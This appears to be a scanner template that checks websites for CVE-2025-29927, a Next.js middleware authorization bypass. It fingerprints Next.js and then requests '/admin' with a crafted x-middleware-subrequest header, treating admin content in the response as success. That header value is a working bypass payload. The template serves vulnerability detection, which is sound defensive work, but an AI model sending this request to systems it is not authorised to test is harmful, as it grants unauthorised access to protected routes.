id: CVE-2025-29927
name: "Next.js Middleware Authorization Bypass"
severity: critical
description: "Next.js allows middleware authorization bypass via the x-middleware-subrequest header, enabling access to protected routes."
reference: CWE-285
requests:
  - method: GET
    path: "/"
    matchers:
      - type: body
        words:
          - "__NEXT_DATA__"
          - "next"
    condition: or
  - method: GET
    path: "/admin"
    headers:
      x-middleware-subrequest: "middleware:middleware:middleware:middleware:middleware"
    matchers:
      - type: status
        status: [200]
      - type: body
        words:
          - "admin"
          - "dashboard"
    condition: and
